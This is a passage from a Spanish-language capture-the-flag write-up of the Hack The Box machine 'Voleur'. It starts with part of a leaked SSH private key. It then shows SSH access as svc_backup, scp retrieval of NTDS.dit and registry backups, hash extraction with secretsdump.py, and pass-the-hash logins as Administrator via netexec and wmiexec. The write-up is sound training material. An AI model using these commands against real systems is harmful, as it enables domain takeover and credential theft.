B9NzMi0MiCLy/HJ4dwwtce3sssxUk7pQAAAMEAzBk3mSKy7UWuhHExrsL/jzqxd7bVmLXU
EEju52GNEQL1TW4UZXVtwhHYrb0Vnu0AE+r/16o0gKScaa+lrEeQqzIARVflt7ZpJdpl3Z
fosiR4pvDHtzbqPVbixqSP14oKRSeswpN1Q50OnD11tpIbesjH4ZVEXv7VY9/Z8VcooQLW
GSgUcaD+U9Ik13vlNrrZYs9uJz3aphY6Jo23+7nge3Ui7ADEvnD3PAtzclU3xMFyX9Gf+9
RveMEYlXZqvJ9PAAAADXN2Y19iYWNrdXBAREMBAgMEBQ==
-----END OPENSSH PRIVATE KEY-----
```

Lo guardamos en un archivo llamado **idrsa** y le damos permiso de usuario `chmod 600 idrsa`

Como no sé a quien pertenece esta clave pública, usaré el comando **`ssh-keygen -y -f id_rsa`** que sirve para leer un archivo de clave privada de SSH.

<p align="center">
<img src="images/svccccbackup.png" width="600" alt="Resultado de Nmap">
</p>

Averiguo que pertenece al usuario **svc_backup**. Sabiendo esto inicio una sesión con este usuario:

```
ssh -i idrsa svc_backup@10.129.232.130 -p 2222
```

#### Shell como administrador

Encontraré la unidad C del host montada en `/mnt/c` :

<p align="center">
<img src="images/c.png" width="600" alt="Resultado de Nmap">
</p>

Desde aquí puedo acceder a la carpeta **backups**

<p align="center">
<img src="images/registryad.png" width="600" alt="Resultado de Nmap">
</p>

#### Dump Hashes

Recopilaré todos los archivos desde el punto `scp` :

```
scp -i idrsa -P 2222 svc_backup@dc.voleur.htb:/mnt/c/IT/Third-Line\ Support/Backups/registry/* .
```

```
scp -i idrsa -P 2222 svc_backup@dc.voleur.htb:/mnt/c/IT/Third-Line\ Support/Backups/Active\ Directory/* .
```

Extrae todas las **credenciales y hashes de contraseñas** (de usuarios y equipos) directamente desde los archivos de respaldo del sistema operativo (**NTDS.dit**, **SYSTEM** y **SECURITY**), permitiéndote realizar un ataque de volcado de hashes _offline_ sin tocar la base de datos activa.

```
secretsdump.py LOCAL -system SYSTEM -security SECURITY -ntds ntds.dit
```

<p align="center">
<img src="images/secretsdumppy.png" width="600" alt="Resultado de Nmap">
</p>

```
netexec smb dc.voleur.htb -u 'Administrator' -H 'e656e07c56d831611b577b160b259ad2' -d 'voleur.htb' -k --kdcHost 10.129.232.130
```

<p align="center">
<img src="images/administratorpwned.png" width="600" alt="Resultado de Nmap">
</p>

Este comando sirve para **conectarse de forma remota como Administrador a través del protocolo WMI utilizando autenticación Kerberos y Pass-the-Hash**

```
wmiexec.py voleur.htb/administrator@dc.voleur.htb -no-pass -hashes :e656e07c56d831611b577b160b259ad2 -k
```

<p align="center">
<img src="images/root.txt.png" width="600" alt="Resultado de Nmap">
</p>

## Conclusión

Esta máquina `Voleur` representa un escenario de escalada de privilegios en **Active Directory** que exige un análisis exhaustivo de los permisos del directorio y la gestión de identidades, donde el vector de ataque inicial parte de la enumeración básica para explotar vulnerabilidades de Kerberos y abusar de permisos de delegación como `WriteSPN`. La ruta crítica depende de la correcta identificación de credenciales expuestas en recursos compartidos y el uso de técnicas de recuperación de objetos eliminados para pivotar hacia cuentas de servicio con privilegios altos, finalizando con la explotación de una configuración insegura en el servicio de respaldos (SSH en puerto no estándar) que facilita la extracción offline de la base de datos `NTDS.dit` para la obtención definitiva del hash de `Administrator`
